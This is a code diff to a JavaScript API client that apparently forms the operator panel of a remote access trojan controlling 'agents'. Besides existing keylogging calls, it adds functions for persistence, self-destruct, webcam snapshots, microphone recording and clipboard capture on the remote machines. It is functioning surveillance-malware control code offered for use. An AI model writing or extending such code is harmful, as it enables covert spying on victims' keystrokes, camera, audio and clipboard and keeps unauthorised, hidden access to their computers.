@@ -54,4 +54,13 @@ export const api = {
   sound: (id, kind, text) => request(`/api/agents/${id}/sound?${query({ kind, text })}`),
   notify: (id, title, body) => request(`/api/agents/${id}/notify?${query({ title, body })}`),
   keylog: (id, action) => request(`/api/agents/${id}/keylog?${query({ action })}`),
+  persist: (id, action, mode) => request(`/api/agents/${id}/persist?${query({ action, mode })}`),
+  selfdestruct: (id) => request(`/api/agents/${id}/selfdestruct`, { method: "POST" }),
+  camUrl: (id) => `/api/agents/${id}/cam?t=${Date.now()}`,
+  mic: async (id, seconds) => {
+    const response = await fetch(`/api/agents/${id}/mic?${query({ sec: seconds })}`);
+    if (!response.ok) throw new Error((await response.text()).slice(0, 200));
+    return URL.createObjectURL(await response.blob());
+  },
+  clip: (id, action, since = 0) => request(`/api/agents/${id}/clip?${query({ action, since })}`),
 };
